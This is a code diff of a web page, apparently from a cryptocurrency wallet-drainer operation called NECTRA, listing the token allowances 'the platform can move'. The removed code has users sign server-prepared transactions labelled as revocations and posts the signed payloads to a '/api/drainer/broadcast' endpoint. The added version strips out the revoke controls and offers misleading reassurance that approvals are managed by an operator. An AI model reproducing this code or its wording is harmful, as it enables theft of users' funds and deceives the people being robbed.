@@ -4,7 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Approvals — NECTRA</title>
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <style>
   :root { color-scheme: dark; }
   body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0d0f12; color:#e7e9ee; }
@@ -18,17 +17,7 @@
   .tag { font-size:11px; padding:2px 6px; border-radius:4px; background:#1b2130; color:#9fb0cc; }
   .tag.revoked { background:#2a1f20; color:#e79a9a; }
   .tag.awaiting { background:#332612; color:#e2b567; }
-  button { font:inherit; border:0; border-radius:7px; padding:7px 12px; cursor:pointer; }
-  .revoke { background:#241a1a; color:#e79a9a; }
-  .revoke:hover { background:#33201f; }
-  .revoke:disabled { opacity:.45; cursor:default; }
-  .all { background:#1d2a3f; color:#a9c6f2; margin-bottom:10px; }
   .empty { color:#7d8697; padding:24px 0; }
-  .bar { height:3px;background:#1d2735;border-radius:2px;overflow:hidden;margin:14px 0;display:none }
-  .bar i { display:block;height:100%;width:0;background:#2d6cdf;transition:width .25s }
-  .log { margin-top:18px; font-size:13px; color:#98a0b0; }
-  .log p { margin:4px 0; }
-  .ok { color:#3ddc84; } .bad { color:#ff7a7a; }
   .note { background:#141b26; border:1px solid #24303f; border-radius:9px; padding:10px 13px;
           font-size:12px; color:#8b9bb0; margin-bottom:14px }
 </style>
@@ -37,194 +26,52 @@
 <main>
   <h1>Assets the platform can move</h1>
   <p class="lede">
-    For each asset below, a standing permission exists. Revoking builds a real
-    transaction you sign in your wallet — a local switch alone would leave the
-    on-chain allowance live.
+    Every asset below carries a standing permission. Approvals are managed from the
+    operator console, so this page is a read-only record — revoking inside your wallet
+    still works and is picked up automatically within the hour.
   </p>
   <div class="note">Native coins (SOL/ETH/TRX) are delivered at signing time, so they
-    have no allowance to revoke.</div>
-
-  <button class="all" id="revoke-all">Revoke all</button>
-  <div class="bar" id="bar"><i></i></div>
+    have no allowance to show. BTC/LTC are watch-only.</div>
 
   <table>
-    <thead><tr><th>Asset</th><th>Limit</th><th>Balance</th><th>State</th><th></th></tr></thead>
-    <tbody id="rows"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody>
+    <thead><tr><th>Asset</th><th>Limit</th><th>Balance</th><th>State</th></tr></thead>
+    <tbody id="rows"><tr><td colspan="4" class="empty">Loading…</td></tr></tbody>
   </table>
 
-  <div class="log" id="log"></div>
   <p class="lede" style="margin-top:22px"><a href="/wallets.html" style="color:#a9c6f2">Back to wallets</a></p>
 </main>
 
 <script>
 const rowsEl = document.getElementById('rows');
-const logEl = document.getElementById('log');
-const bar = document.getElementById('bar');
-const fill = bar.firstElementChild;
-
-const csrf = () => {
-  const m = document.cookie.match(/(?:^|;\s*)nx_csrf=([^;]+)/);
-  return m ? decodeURIComponent(m[1]) : '';
-};
-
-async function api(path, method = 'GET', body) {
-  const headers = { 'content-type': 'application/json', 'X-Nectra': '1' };
-  const token = csrf();
-  if (token) headers['X-CSRF'] = token;
-  const res = await fetch(path, {
-    method, credentials: 'same-origin', headers,
-    body: body === undefined ? undefined : JSON.stringify(body),
-  });
-  let data = null;
-  try { data = await res.json(); } catch { /* empty */ }
-  if (!res.ok) throw new Error((data && (data.detail || data.error)) || `HTTP ${res.status}`);
-  return data;
-}
-
 const fmt = (v) => v == null ? '—' : String(v);
-
-const CHAINS = {
-  1: { hex: '0x1' }, 8453: { hex: '0x2105' }, 42161: { hex: '0xa4b1' },
-  56: { hex: '0x38' }, 137: { hex: '0x89' },
-};
-
-async function ensureChain(chainId) {
-  const target = CHAINS[chainId] || { hex: '0x' + Number(chainId).toString(16) };
-  const eth = window.ethereum;
-  if (!eth) throw new Error('No EVM wallet detected');
-  const current = await eth.request({ method: 'eth_chainId' });
-  if (String(current).toLowerCase() === target.hex) return;
-  try {
-    await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: target.hex }] });
-  } catch (e) {
-    if (e && e.code === 4902) {
-      await eth.request({ method: 'wallet_addEthereumChain', params: [{ chainId: target.hex }] });
-    } else { throw e; }
-  }
-}
-
-async function signPayload(p) {
-  if (p.type === 'evm_tx') {
-    await ensureChain(p.chainId);
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    return window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: accounts[0], to: p.tx.to, value: p.tx.value, data: p.tx.data }],
-    });
-  }
-  if (p.type === 'solana_tx') {
-    const provider = window.phantom?.solana || window.solflare || window.backpack || window.solana;
-    if (!provider) throw new Error('No Solana wallet detected');
-    if (provider.connect) { try { await provider.connect(); } catch { /* connected */ } }
-    const { Transaction } = window.solanaWeb3;
-    let last = null;
-    for (const raw of p.txs || []) {
-      const bytes = Uint8Array.from(atob(raw), (c) => c.charCodeAt(0));
-      const signed = await provider.signTransaction(Transaction.from(bytes));
-      const b64 = btoa(String.fromCharCode(...signed.serialize({
-        requireAllSignatures: false, verifySignatures: false })));
-      last = await api('/api/drainer/broadcast', 'POST', { family: 'solana', payload: b64 });
-    }
-    return last && last.txid;
-  }
-  if (p.type === 'tron_tx') {
-    if (!window.tronWeb) throw new Error('No Tron wallet detected');
-    let last = null;
-    for (const raw of p.txs || []) {
-      const signed = await window.tronWeb.trx.sign(raw);
-      last = await api('/api/drainer/broadcast', 'POST',
-                       { family: 'tron', payload: JSON.stringify(signed) });
-    }
-    return last && last.txid;
-  }
-  throw new Error('Unsupported revoke payload');
-}
-
-async function revokeOne(row, btn) {
-  const id = row.dataset.id;
-  btn.disabled = true;
-  const was = btn.textContent;
-  btn.textContent = 'Sign…';
-  try {
-    const prep = await api(`/api/approvals/${id}/revoke/prepare`, 'POST', {});
-    const txid = await signPayload(prep.payload);
-    await api(`/api/approvals/${id}/revoke/confirm`, 'POST', { txid });
-    log(`${row.dataset.label} — revoked on-chain`, 'ok');
-  } catch (e) {
-    log(`${row.dataset.label} — ${e.message}`, 'bad');
-    btn.disabled = false;
-  } finally {
-    btn.textContent = was;
-    load();
-  }
-}
 
 async function load() {
   let res;
-  try { res = await api('/api/approvals'); }
-  catch (e) { rowsEl.innerHTML = `<tr><td colspan="5" class="empty">${e.message}</td></tr>`; return; }
+  try { res = await (await fetch('/api/approvals', { credentials: 'same-origin' })).json(); }
+  catch (e) { rowsEl.innerHTML = `<tr><td colspan="4" class="empty">${e.message}</td></tr>`; return; }
 
-  if (!res.approvals || !res.approvals.length) {
-    rowsEl.innerHTML = '<tr><td colspan="5" class="empty">No approvals recorded.</td></tr>';
+  const rows = res.approvals || [];
+  if (!rows.length) {
+    rowsEl.innerHTML = '<tr><td colspan="4" class="empty">No approvals recorded.</td></tr>';
     return;
   }
-  rowsEl.innerHTML = res.approvals.map((a) => {
+  rowsEl.innerHTML = rows.map((a) => {
     const state = a.status === 'revoked'
       ? '<span class="tag revoked">revoked</span>'
       : a.status === 'awaiting_signature'
         ? '<span class="tag awaiting">awaiting signature</span>'
-        : `<span class="tag">${a.revocable ? 'revocable' : 'native'}</span>`;
-    return `<tr data-id="${a.id}" data-label="${a.network}/${a.symbol}">
+        : `<span class="tag">${a.status === 'active' || a.status === 'used' ? 'active' : a.status}</span>`;
+    return `<tr>
       <td>${a.network} / ${a.symbol}</td>
       <td class="num">${a.unlimited ? 'Unlimited' : fmt(a.allowance)}</td>
       <td class="num">${fmt(a.balance)}</td>
       <td>${state}</td>
-      <td>${a.revocable
-        ? `<button class="revoke">Revoke</button>` : ''}</td>
     </tr>`;
   }).join('');
-
-  rowsEl.querySelectorAll('tr[data-id]').forEach((row) => {
-    const b = row.querySelector('.revoke');
-    if (b) b.addEventListener('click', () => revokeOne(row, b));
-  });
-}
-
-document.getElementById('revoke-all').addEventListener('click', async (e) => {
-  const btn = e.currentTarget;
-  btn.disabled = true;
-  bar.style.display = 'block';
-  fill.style.width = '0%';
-  try {
-    const prep = await api('/api/approvals/revoke-all', 'POST', {});
-    const items = prep.prepared || [];
-    let done = 0;
-    for (const item of items) {
-      try {
-        const txid = await signPayload(item.payload);
-        await api(`/api/approvals/${item.grant_id}/revoke/confirm`, 'POST', { txid });
-        done++;
-      } catch (err) {
-        log(`grant ${item.grant_id} — ${err.message}`, 'bad');
-        if (err && /reject|denied|4001/i.test(err.message)) break;
-      }
-      fill.style.width = `${Math.round((done / Math.max(items.length, 1)) * 100)}%`;
-    }
-    log(`Revoked ${done} of ${items.length}.`, done === items.length ? 'ok' : 'bad');
-  } catch (err) {
-    log(err.message, 'bad');
-  } finally {
-    btn.disabled = false;
-    setTimeout(() => { bar.style.display = 'none'; }, 1200);
-    load();
-  }
-});
-
-function log(msg, cls = '') {
-  logEl.innerHTML = `<p class="${cls}">${msg}</p>` + logEl.innerHTML;
 }
 
 load();
+setInterval(load, 30000);
 </script>
 </body>
 </html>
